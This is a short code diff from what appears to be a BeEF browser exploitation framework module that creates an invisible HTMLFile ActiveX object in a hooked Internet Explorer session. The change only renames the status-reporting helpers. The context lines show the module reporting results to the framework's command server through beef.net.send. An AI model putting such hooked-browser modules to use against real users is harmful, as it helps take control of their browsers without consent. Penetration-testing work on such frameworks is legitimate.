@@ -20,9 +20,9 @@ beef.execute(function() {
  
     // Prevent IE from destroying the previous reference
     window.open("","_self");
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "success=created HTMLFile ActiveX object", beef.are.status_success());
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "success=created HTMLFile ActiveX object", beef.status.success());
   } catch (e) {
     beef.debug("[Invisible HTMLFile ActiveX] could not create HTMLFile ActiveX object: "+e.message)
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=could not create HTMLFile ActiveX object: " + e.message, beef.are.status_error());
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=could not create HTMLFile ActiveX object: " + e.message, beef.status.error());
   }
 });
